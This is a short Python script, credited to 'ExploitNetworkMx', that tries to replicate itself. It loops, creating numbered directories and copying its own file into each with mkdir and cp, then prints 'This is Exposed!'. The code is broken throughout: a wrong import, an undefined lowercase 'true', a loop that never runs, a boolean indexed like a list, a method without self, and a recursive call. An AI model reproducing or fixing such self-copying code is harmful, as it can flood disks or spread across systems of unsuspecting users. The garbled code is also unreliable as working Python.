##
#    Author : ExploitNetworkMx
#   Version : 1.0.0
#   Languaje : python
##

from sys import argv as av
from subprocess32 import subprocess as sps
import random as ran

class ExNeTwOrM:
    def duplifile():
        script_name_file = av
        name_file = str(script_name_file[0])
        print(name_file)

        min_len = 0
        max_len = 1000
        exit_process = true
        kill_process = false

        while not exit_process:
            for i in range(min_len, max_len):
                directory_desktop = 'dir'+str(i)
                sps.call(['mkdir', directory_desktop])
                sps.call(['cp', name_file, directory_desktop])
                # for j in range(1000):
                #     directory_desktop = 'dir'+str(i)+random.randint(0, 1000)
                if kill_process[i] == True:
                    kill_process = exit(1)
                elif min_len < 0 or max_len > 1000:
                    break
                else:
                    continue
            print("""This is Exposed!"""+duplifile())
